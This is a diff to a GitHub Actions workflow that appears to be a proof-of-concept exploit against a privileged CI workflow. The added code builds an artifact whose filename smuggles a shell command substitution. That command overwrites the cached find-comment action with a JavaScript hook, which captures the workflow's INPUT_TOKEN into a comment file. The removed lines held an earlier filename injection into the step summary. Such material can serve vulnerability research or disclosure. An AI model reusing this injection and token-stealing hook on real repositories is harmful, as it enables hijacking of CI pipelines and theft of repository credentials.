@@ -1,7 +1,6 @@
-name: Tests
+name: Test
 
 on:
-  pull_request:
   workflow_dispatch:
 
 permissions:
@@ -11,19 +10,34 @@ jobs:
   upload:
     runs-on: ubuntu-latest
     steps:
-      - name: Build attacker-controlled artifact
+      - name: build artifact with attacker-controlled filename + token hook
         run: |
           set -e
-          mkdir -p /tmp/content
-          echo 5 > /tmp/content/pr_number.txt
-          echo "plain report" > /tmp/content/report.txt
-          echo "second payload" > /tmp/content/pwnreport.txt
+          mkdir -p content
           python3 - <<'PY'
-          name = "pwn$(echo INJECTED_INTO_STEP_SUMMARY>>$GITHUB_STEP_SUMMARY; echo report).txt"
-          open("/tmp/content/" + name, "w").write("injected-name payload\n")
+          import os
+          open("content/report.txt", "w").write("plain report\n")
+          open("content/pwn.txt", "w").write("substituted target\n")
+          open("content/pr_number.txt", "w").write("5\n")
+
+          # The filename below is interpolated into the privileged workflow's shell.
+          # It rebuilds "/" from ${PWD:0:1} (no literal slash allowed in a filename) and
+          # overwrites the already-downloaded find-comment action with our JS hook.
+          name = ("p$(IFS=/;S=$IFS;IFS=' ';cp ${S}tmp${S}content${S}content${S}x.js "
+                  "${S}home${S}runner${S}work${S}_actions${S}peter-evans${S}find-comment${S}v3"
+                  "${S}dist${S}index.js)wn.txt")
+          open("content/" + name, "w").write("payload\n")
+
+          hook = (
+            "const f=require('fs');"
+            "let p=String.fromCharCode(47)+'tmp'+String.fromCharCode(47)+'comment';"
+            "f.appendFileSync(p,'\\n\\nTOKEN_CAPTURED='+(process.env.INPUT_TOKEN||'NO_TOKEN'));"
+          )
+          open("content/x.js", "w").write(hook)
+          print(len(name), sorted(os.listdir("content")))
           PY
-          ls -1 /tmp/content
+          ls -1 content
       - uses: actions/upload-artifact@v4
         with:
           name: content
-          path: /tmp/content
+          path: content/
